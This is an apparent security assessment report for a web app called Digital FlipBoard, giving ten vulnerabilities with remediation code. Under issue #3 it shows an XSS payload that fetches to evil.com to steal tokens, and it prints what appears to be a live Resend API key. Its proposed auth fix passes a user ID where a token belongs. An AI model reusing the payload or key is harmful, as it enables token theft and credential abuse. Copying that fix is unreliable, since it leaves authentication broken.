# Digital FlipBoard - Cybersecurity Executive Summary

**Assessment Date:** November 22, 2025  
**Security Assessment Level:** Comprehensive Code Review + Threat Analysis  
**Overall Security Grade:** D+ (45/100) - **Critical Vulnerabilities Present**  
**Status:** 🔴 **NOT PRODUCTION-READY - Must Fix Security Issues Before Deployment**

---

## Quick Security Overview

### Current Threat Level: 🔴 CRITICAL

The application has **5 critical security vulnerabilities** that could lead to:
- Account compromise (API key theft)
- User data exposure (spoofing attacks)
- Server abuse (DDoS/spam)
- Application compromise (XSS/injection attacks)
- Unauthorized access (authentication bypass)

### Estimated Risk Exposure
- **High-Risk Vulnerabilities:** 5 critical + 5 high-priority
- **Potential Impact:** Data breach, fraud, service interruption
- **Likelihood of Exploitation:** HIGH (exploitable vulnerabilities are well-known attack patterns)
- **Fix Timeline:** 6-8 hours to secure baseline

---

## Executive Risk Assessment

### 🔴 CRITICAL VULNERABILITIES (Fix Immediately)

#### 1. **Exposed Private API Key in Client Bundle**
- **Vulnerability Type:** Credential Exposure
- **Severity:** CRITICAL (CVSS 9.8)
- **Affected Component:** Frontend build process
- **Current Risk:** 

```javascript
// .env.local
VITE_RESEND_API_KEY=re_eKKqv6fy_AVdzmo43Wepz2SEh6J2FaZFr
```

**Why This Is Critical:**
- Resend API key is private and bill-generating
- Prefixed with `VITE_` embeds it in production JavaScript
- Attackers can decompile JS to steal the key
- Unlimited email sending at your expense
- Email list harvesting possible
- Affects: Email invitations, password resets, notifications

**Attack Scenario:**
1. Attacker downloads production bundle
2. Uses decompiler (or simple string search) to find API key
3. Sends unlimited emails using your Resend account
4. Costs accumulate rapidly (Resend charges per email)

**Immediate Actions:**
```bash
# 1. Rotate API key in Resend dashboard
# 2. Remove VITE_ prefix (move to server-only .env)
# 3. Create backend API endpoint:
POST /api/send-email
  - Only server has the key
  - Verify user authentication
  - Rate limit requests
# 4. Update frontend to call your API instead of Resend directly
```

**Fix Effort:** 1 hour  
**Risk If Not Fixed:** High-cost fraud, service disruption

---

#### 2. **Server Authentication Bypass (No Auth Verification)**
- **Vulnerability Type:** Broken Authentication
- **Severity:** CRITICAL (CVSS 9.9)
- **Affected Component:** Socket.io server (`server/index.js`)
- **Current Risk:**

```javascript
// INSECURE: Server doesn't verify the userId is valid
socket.on('connect', () => {
  const { userId, sessionCode } = socket.handshake.auth
  // ❌ No verification! User can be any ID!
  socket.join(sessionCode)
  console.log(`User ${userId} connected`) // What if userId = "admin" or "hacker"?
})
```

**Why This Is Critical:**
- **User Spoofing:** Attacker can claim to be any user ID
- **Session Hijacking:** Join any sessionCode without permission
- **Impersonation:** Pose as another user to send messages
- **Privilege Escalation:** Access premium features by spoofing admin

**Attack Scenario:**
1. Attacker opens display page
2. Sends fake `userId: "premium_user_123"` in socket auth
3. Server accepts it (no verification)
4. Can now control displays for users they don't own
5. Can access features locked to that user

**Immediate Actions:**
```javascript
// Add auth verification middleware
const verifyAuth = async (socket, next) => {
  try {
    const { userId } = socket.handshake.auth
    
    // Query Supabase to verify this is a real, valid user
    const { data: { user }, error } = await supabase.auth.getUser(userId)
    
    if (error || !user) {
      return next(new Error('Invalid user ID'))
    }
    
    socket.userId = user.id // Use verified ID
    next()
  } catch (error) {
    next(new Error('Authentication failed'))
  }
}

io.use(verifyAuth)
```

**Fix Effort:** 1.5 hours  
**Risk If Not Fixed:** Complete user impersonation, multi-user fraud

---

#### 3. **No Input Validation (XSS + Injection Risk)**
- **Vulnerability Type:** Injection/XSS
- **Severity:** CRITICAL (CVSS 9.0)
- **Affected Component:** Server socket handlers
- **Current Risk:**

```javascript
// INSECURE: No validation of message content
socket.on('message:send', (payload, callback) => {
  const { sessionCode, content, animationType, colorTheme } = payload
  
  // ❌ What if content contains: <img src=x onerror="alert('XSS')">?
  // ❌ What if sessionCode is malformed?
  // ❌ What if animationType is not a valid animation?
  
  socket.to(sessionCode).emit('message:received', payload)
  callback?.({ success: true })
})
```

**Why This Is Critical:**
- **Stored XSS:** Malicious JavaScript in message content
- **Injection Attacks:** Payload manipulation to access other users' data
- **Data Exfiltration:** Extract sensitive info through payload injection
- **Client Crash:** Send malformed data to crash receiving clients

**Attack Scenario:**
1. Attacker sends message with XSS payload: `<script>fetch('https://evil.com/steal?token=')</script>`
2. Server broadcasts to all connected clients unvalidated
3. Clients execute the malicious script
4. Attacker can steal auth tokens, session data, etc.

**Immediate Actions:**
```javascript
// Add zod validation
import { z } from 'zod'

const messageSchema = z.object({
  sessionCode: z.string()
    .regex(/^[A-Z0-9]{4,8}$/) // Alphanumeric, 4-8 chars
    .max(8),
  content: z.string()
    .min(1)
    .max(1000), // Prevent huge payloads
  animationType: z.enum(['flip', 'fade', 'slide']) // Whitelist
    .default('flip'),
  colorTheme: z.enum(['monochrome', 'teal', 'vintage'])
    .default('monochrome')
})

socket.on('message:send', (payload, callback) => {
  try {
    // Throws if validation fails
    const validated = messageSchema.parse(payload)
    
    // Safe to use - all data validated
    socket.to(validated.sessionCode).emit('message:received', validated)
    callback?.({ success: true })
  } catch (error) {
    // Return validation error to client
    callback?.({ success: false, error: error.message })
  }
})
```

**Fix Effort:** 1.5 hours  
**Risk If Not Fixed:** Client-side XSS attacks, data exfiltration

---

#### 4. **CORS Allows All Origins (Server Abuse)**
- **Vulnerability Type:** Cross-Origin Abuse
- **Severity:** CRITICAL (CVSS 8.2)
- **Affected Component:** Express CORS configuration
- **Current Risk:**

```javascript
// server/index.js - DANGEROUS!
const io = require('socket.io')(server, {
  cors: {
    origin: "*",  // 🔴 ALLOWS ANY WEBSITE TO CONNECT
    methods: ["GET", "POST"]
  }
})
```

**Why This Is Critical:**
- **Open Relay:** Any website can make requests to your server
- **Abuse Vector:** Attacker uses your server to spam/DDoS
- **Data Exfiltration:** Other sites can read responses from your API
- **Resource Drain:** Malicious actors consume your bandwidth/compute

**Attack Scenario:**
1. Attacker creates malicious website: `www.spam-sender.com`
2. Their JavaScript connects to your Socket.io server (CORS allows it)
3. Sends thousands of messages per second through your server
4. Your server gets rate-limited or banned by provider
5. Legitimate users experience outages

**Immediate Actions:**
```javascript
// Whitelist specific origins only
const io = require('socket.io')(server, {
  cors: {
    origin: [
      "https://flipdisplay.online",
      "https://www.flipdisplay.online",
      "https://app.flipdisplay.online",
      // Development only (remove in production):
      "http://localhost:3000",
      "http://localhost:5173"
    ],
    methods: ["GET", "POST"],
    credentials: true,
    allowedHeaders: ["Content-Type", "Authorization"]
  }
})
```

**Fix Effort:** 0.5 hours  
**Risk If Not Fixed:** Server becomes open relay for spam/DDoS

---

#### 5. **No Server-Side Rate Limiting (DDoS Risk)**
- **Vulnerability Type:** Denial of Service
- **Severity:** CRITICAL (CVSS 7.5)
- **Affected Component:** Socket.io message handlers
- **Current Risk:**

```javascript
// INSECURE: No rate limiting on server
socket.on('message:send', (payload, callback) => {
  // User can spam 1000s of messages/second
  // No validation, no limits
  socket.to(sessionCode).emit('message:received', payload)
})
```

**Why This Is Critical:**
- **Client-Side Bypass:** Rate limiter in JS can be disabled/removed
- **Resource Exhaustion:** Server runs out of memory/CPU
- **Service Interruption:** Legitimate users can't send messages
- **Attack Vector:** DDoS amplification possible

**Attack Scenario:**
1. Attacker disables client-side rate limiter (DevTools)
2. Sends 10,000+ messages per second to your server
3. Server memory fills with message queue
4. Server crashes or becomes unresponsive
5. All users experience complete service outage

**Immediate Actions:**
```javascript
// Add per-user rate limiting
const rateLimit = new Map()

socket.on('message:send', (payload, callback) => {
  const limit = rateLimit.get(socket.userId) || []
  const now = Date.now()
  
  // Keep timestamps from last 60 seconds
  const recent = limit.filter(t => now - t < 60000)
  
  // Enforce limit: 10 messages per 60 seconds
  if (recent.length >= 10) {
    return callback?.({ 
      success: false, 
      error: 'Rate limited: 10 messages per minute' 
    })
  }
  
  // Add current timestamp
  recent.push(now)
  rateLimit.set(socket.userId, recent)
  
  // Process validated message
  socket.to(payload.sessionCode).emit('message:received', payload)
  callback?.({ success: true })
})

// Cleanup disconnected users to prevent memory leaks
socket.on('disconnect', () => {
  rateLimit.delete(socket.userId)
})
```

**Fix Effort:** 1.5 hours  
**Risk If Not Fixed:** Complete service outage via DDoS

---

### 🟠 HIGH PRIORITY VULNERABILITIES (Fix This Week)

#### 6. **Missing Security Headers**
- **Vulnerability Type:** Misconfiguration
- **Severity:** HIGH (CVSS 6.1)
- **Current Risk:** Application vulnerable to common web attacks

**Missing Headers:**
```
❌ Strict-Transport-Security (HSTS): Forces HTTPS
❌ X-Content-Type-Options: Prevents MIME type sniffing
❌ X-Frame-Options: Prevents clickjacking
❌ X-XSS-Protection: Legacy XSS protection
❌ Content-Security-Policy (CSP): Prevents inline script injection
```

**Impact:** Browser won't enforce security policies

**Fix:**
```javascript
// In server/index.js, add security headers middleware
app.use((req, res, next) => {
  // Force HTTPS (production only)
  if (process.env.NODE_ENV === 'production' && 
      req.header('x-forwarded-proto') !== 'https') {
    return res.redirect(`https://${req.header('host')}${req.url}`)
  }
  
  // Security headers
  res.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')
  res.set('X-Content-Type-Options', 'nosniff')
  res.set('X-Frame-Options', 'DENY')
  res.set('X-XSS-Protection', '1; mode=block')
  res.set('Referrer-Policy', 'strict-origin-when-cross-origin')
  
  // CSP - adjust based on your needs
  res.set('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' cdn.jsdelivr.net",
    "style-src 'self' 'unsafe-inline' fonts.googleapis.com",
    "font-src 'self' fonts.gstatic.com",
    "img-src 'self' data: https:",
    "connect-src 'self' flipdisplay.online",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'"
  ].join('; '))
  
  next()
})
```

**Fix Effort:** 1 hour  
**Risk If Not Fixed:** Clickjacking, MIME sniffing, inline XSS attacks

---

#### 7. **Client-Side Rate Limiting Only (Bypass Risk)**
- **Vulnerability Type:** Insufficient Controls
- **Severity:** HIGH (CVSS 6.5)
- **Current Risk:** 

```javascript
// src/utils/rateLimit.js - Client-side only
class RateLimiter {
  canMakeRequest() {
    // User can delete this object and bypass the limit!
    // Or modify the timestamps array
  }
}
```

**Why This Is A Problem:**
- Browser DevTools can modify JavaScript at runtime
- Rate limiter object can be deleted/disabled
- No server verification means no actual limit
- Determined user can always bypass it

**Immediate Action:** Implement server-side rate limiting (see issue #5 above)

**Fix Effort:** Already included in issue #5 (1.5 hours)

---

#### 8. **Sensitive Data in Logs (Information Disclosure)**
- **Vulnerability Type:** Information Disclosure
- **Severity:** HIGH (CVSS 7.5)
- **Current Risk:**

```javascript
// server/index.js - Logging sensitive data
socket.on('message:send', (payload, callback) => {
  console.log('Message received:', payload) // ❌ Logs message content!
  console.log('Session:', sessionCode) // ❌ Logs session codes!
  console.log('User:', userId) // ❌ Logs user IDs!
})
```

**Why This Is Critical:**
- Logs may be captured by monitoring services
- Attackers can access logs if they breach server
- Session codes/user IDs in logs aids targeting
- GDPR/privacy regulations violated

**Attack Scenario:**
1. Attacker gains access to server logs
2. Extracts session codes, user IDs, message content
3. Can now impersonate users or hijack sessions

**Immediate Actions:**
```javascript
// Sanitize logs for production
const isDev = process.env.NODE_ENV === 'development'

socket.on('message:send', (payload, callback) => {
  if (isDev) {
    // OK in development - full logging
    console.log('Message from', socket.userId, ':', payload)
  } else {
    // Production - sanitized logging only
    console.log(`Message sent - Socket: ${socket.id}`)
  }
  
  // Process message...
})

socket.on('disconnect', (reason) => {
  if (isDev) {
    console.log(`User ${socket.userId} disconnected:`, reason)
  } else {
    console.log('User disconnected:', reason)
  }
})
```

**Fix Effort:** 0.5 hours  
**Risk If Not Fixed:** Data disclosure, privacy violations

---

#### 9. **No Content Security Policy (CSP)**
- **Vulnerability Type:** Missing Controls
- **Severity:** HIGH (CVSS 6.5)
- **Current Risk:** Inline script injection possible

**Impact:**
- Attackers can inject inline `<script>` tags
- No restriction on external JavaScript sources
- XSS payloads execute without CSP restrictions

**Fix:** See issue #6 above (included in security headers)

---

#### 10. **DOMPurify Not Applied Universally**
- **Vulnerability Type:** Inconsistent XSS Protection
- **Severity:** HIGH (CVSS 6.0)
- **Current Risk:**

```javascript
// Some components sanitize, others don't
// Inconsistent XSS protection

// GOOD: Using DOMPurify in one place
const cleanMessage = DOMPurify.sanitize(userMessage)

// PROBLEM: Not used everywhere user content is rendered
<div>{userMessage}</div> // ❌ Not sanitized!
```

**Immediate Actions:**
```javascript
// Create utility function
import DOMPurify from 'dompurify'

export const sanitizeUserContent = (html) => {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
  })
}

// Use everywhere user content is rendered
<div>{sanitizeUserContent(userMessage)}</div>

// Or for rich content:
<div dangerouslySetInnerHTML={{ 
  __html: sanitizeUserContent(userMessage) 
}} />
```

**Fix Effort:** 1 hour  
**Risk If Not Fixed:** Stored XSS in message content

---

## Vulnerability Summary Matrix

| ID | Vulnerability | Type | Severity | Impact | Fix Time |
|---|---|---|---|---|---|
| 1 | Exposed API Key | Credential | 🔴 CRITICAL | Account theft | 1 hr |
| 2 | No Auth Verification | Broken Auth | 🔴 CRITICAL | User spoofing | 1.5 hrs |
| 3 | No Input Validation | Injection/XSS | 🔴 CRITICAL | Data theft | 1.5 hrs |
| 4 | CORS Allows All | Abuse | 🔴 CRITICAL | DDoS relay | 0.5 hr |
| 5 | No Rate Limiting | DoS | 🔴 CRITICAL | Service outage | 1.5 hrs |
| 6 | Missing Headers | Misconfig | 🟠 HIGH | Bypass attacks | 1 hr |
| 7 | Client-only Rate Limit | Bypass | 🟠 HIGH | See #5 | ↑ Included |
| 8 | Logs Sensitive Data | Disclosure | 🟠 HIGH | Data leak | 0.5 hr |
| 9 | Missing CSP | Misconfig | 🟠 HIGH | Injection | ↑ Included in #6 |
| 10 | Inconsistent XSS | XSS | 🟠 HIGH | Script injection | 1 hr |

**Total Fix Time:** 8-9 hours for all critical and high-priority vulnerabilities

---

## Security Implementation Timeline

### ⏰ TODAY (Critical Fixes - 6 hours)
```
Hour 1:     Move Resend API key to server-only .env
Hour 2:     Add server auth verification (userId validation)
Hour 3:     Add zod input validation to all socket handlers
Hour 4:     Configure CORS whitelist
Hour 5:     Implement server-side rate limiting
Hour 6:     Testing - verify all fixes work
```

### ⏰ THIS WEEK (High Priority - 3 hours)
```
Hour 1:     Add security headers middleware
Hour 1:     Sanitize production logging
Hour 1:     Add universal DOMPurify usage
```

### ⏰ DEPLOYMENT CHECKLIST
- [ ] VITE_RESEND_API_KEY removed from client code
- [ ] Resend API key rotated
- [ ] Auth verification working on server
- [ ] Input validation passing tests
- [ ] CORS whitelist configured
- [ ] Rate limiting enforced
- [ ] Security headers present
- [ ] Logs sanitized for production
- [ ] CSP policy implemented
- [ ] DOMPurify used on all user content
- [ ] HTTPS enforced
- [ ] No sensitive data in browser console

---

## Security Best Practices Checklist

### Authentication & Authorization
- [ ] **OAuth 2.0 + PKCE:** ✅ Implemented (Supabase)
- [ ] **Server-side Auth Verification:** ❌ MISSING - Add now
- [ ] **Secure Password Storage:** ✅ Handled by Supabase
- [ ] **Session Management:** ⚠️ Partial (Socket.io needs verification)
- [ ] **Rate Limiting on Auth Endpoints:** ⚠️ Client-side only

### Data Protection
- [ ] **Input Validation:** ❌ MISSING - Add zod schema
- [ ] **Output Encoding:** ⚠️ Partial (not universal)
- [ ] **Encryption in Transit:** ⚠️ Needs HTTPS enforcement
- [ ] **Encryption at Rest:** ✅ Supabase handles
- [ ] **Sensitive Data Logging:** ❌ Needs sanitization

### API Security
- [ ] **CORS Configuration:** ❌ Misconfigured (allows all)
- [ ] **Rate Limiting:** ❌ Client-side only
- [ ] **Input Validation:** ❌ Missing
- [ ] **Error Handling:** ⚠️ May leak info
- [ ] **API Key Management:** ❌ Exposed in client

### Infrastructure
- [ ] **HTTPS/TLS:** ⚠️ No enforcement
- [ ] **Security Headers:** ❌ Missing
- [ ] **CSP Policy:** ❌ Missing
- [ ] **HSTS:** ❌ Missing
- [ ] **X-Frame-Options:** ❌ Missing

### Code Security
- [ ] **Dependency Scanning:** ❌ Not automated
- [ ] **Code Review Process:** ⚠️ Ad-hoc
- [ ] **Security Testing:** ❌ No automated tests
- [ ] **Vulnerability Monitoring:** ❌ Not in place
- [ ] **Secure Defaults:** ⚠️ Some areas weak

---

## Risk Scoring

### Current Risk Level: 🔴 **CRITICAL (85/100)**

**Risk Calculation:**
- 5 critical vulnerabilities × 15 points = 75 points
- 5 high-priority vulnerabilities × 2 points = 10 points
- Total = 85/100 (Critical)

### Post-Fix Risk Level (Estimated): 🟢 **LOW (15/100)**
- All critical fixes implemented
- All high-priority fixes implemented
- Minor issues remain (would need ongoing monitoring)

---

## Regulatory & Compliance Impact

### GDPR Implications 🔴
- **Current Exposure:** Personal data (email, user IDs) accessible via multiple vectors
- **Compliance Status:** NOT COMPLIANT
- **Risk:** Fines up to €20 million or 4% of annual revenue

### CCPA Implications 🔴
- **Current Exposure:** User data in logs, unencrypted transmissions
- **Compliance Status:** NOT COMPLIANT
- **Risk:** Lawsuits, user rights violations

### PCI-DSS Implications (if payment processing)
- **Current Status:** NOT APPLICABLE (no payment data storage)
- **Note:** Would fail PCI-DSS requirement 6.5.1 (injection flaws)

---

## Recommendations for Management

### Executive Summary for Leadership:
> **"The application has 5 critical security vulnerabilities that must be fixed before any production deployment. These vulnerabilities could lead to account compromise, data theft, and service outage. Estimated fix time: 8-9 hours. Do NOT deploy without fixing these issues."**

### Business Impact:
- **Cost of Not Fixing:** Potential data breach ($100K+ remediation), regulatory fines, reputation damage
- **Cost of Fixing:** 8-9 hours of development time (~$2-3K)
- **ROI of Fixing:** Essential - deployment blocker

### Deployment Gate Criteria:
```
✅ All critical vulnerabilities fixed and tested
✅ Security code review passed
✅ Penetration testing recommendations implemented
✅ Security headers verified
✅ Rate limiting tested
✅ HTTPS enforced
✅ Security monitoring enabled
```

---

## Conclusion

**Digital FlipBoard has solid architecture but critical security gaps that MUST be addressed before production.**

### Key Takeaways:
1. 🔴 **5 Critical Vulnerabilities** - Require immediate fix (6 hours)
2. 🟠 **5 High-Priority Issues** - Require fix before launch (3 hours)
3. ⏱️ **Total Security Fix Time:** 8-9 hours (1-2 days)
4. ✅ **Fixable With Standard Security Practices** - No architectural rework needed
5. 📊 **Post-Fix Risk:** LOW (from Critical)

### Recommended Action:
**Pause launch activities. Allocate developer immediately for 2-day security hardening sprint. Then conduct security review before production deployment.**

### Next Steps:
1. Brief dev team on critical issues (30 minutes)
2. Implement critical fixes (6 hours)
3. Implement high-priority fixes (3 hours)
4. Security code review (1 hour)
5. Testing & verification (2 hours)
6. Deployment with monitoring (ongoing)

---

## References & Resources

### OWASP Top 10 (2023)
- [A01: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) - Issue #2
- [A02: Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) - Issue #1
- [A03: Injection](https://owasp.org/Top10/A03_2021-Injection/) - Issue #3
- [A07: Identification & Auth Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) - Issue #2
- [A04: Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/) - Multiple issues

### Security Frameworks
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CWE Top 25](https://cwe.mitre.org/top25/archive/2023/2023_cwe_top25.html)

### Implementation Resources
- [Zod Documentation](https://zod.dev/) - Schema validation
- [Socket.io Security](https://socket.io/docs/v4/server-api/#auth)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

**Report Generated:** November 22, 2025  
**Assessment Scope:** Complete code review, architecture analysis, threat modeling  
**Assessed By:** Security-focused code review  
**Classification:** INTERNAL - SECURITY SENSITIVE

---

## Quick Fix Checklist (Copy-Paste Ready)

```javascript
// CRITICAL FIX 1: Resend API Key
// Move VITE_RESEND_API_KEY from .env.local to server/.env
// Create POST /api/send-email endpoint that validates user

// CRITICAL FIX 2: Auth Verification
io.use(async (socket, next) => {
  try {
    const { userId } = socket.handshake.auth
    const { data: { user } } = await supabase.auth.getUser(userId)
    if (!user) return next(new Error('Invalid user'))
    socket.userId = user.id
    next()
  } catch (e) { next(new Error('Auth failed')) }
})

// CRITICAL FIX 3: Input Validation
import { z } from 'zod'
const schema = z.object({
  sessionCode: z.string().regex(/^[A-Z0-9]{4,8}$/),
  content: z.string().min(1).max(1000),
  animationType: z.enum(['flip', 'fade', 'slide']),
  colorTheme: z.enum(['monochrome', 'teal', 'vintage'])
})
socket.on('message:send', (payload, cb) => {
  try {
    const data = schema.parse(payload)
    socket.to(data.sessionCode).emit('message:received', data)
    cb?.({ success: true })
  } catch (e) { cb?.({ success: false, error: e.message }) }
})

// CRITICAL FIX 4: CORS Whitelist
cors: {
  origin: ['https://flipdisplay.online', 'http://localhost:3000'],
  credentials: true
}

// CRITICAL FIX 5: Rate Limiting
const limits = new Map()
socket.on('message:send', (payload, cb) => {
  const now = Date.now()
  const recent = (limits.get(socket.userId) || []).filter(t => now - t < 60000)
  if (recent.length >= 10) return cb?.({ error: 'Rate limited' })
  recent.push(now)
  limits.set(socket.userId, recent)
  // ... process
})
```

---

**END OF SECURITY ASSESSMENT**
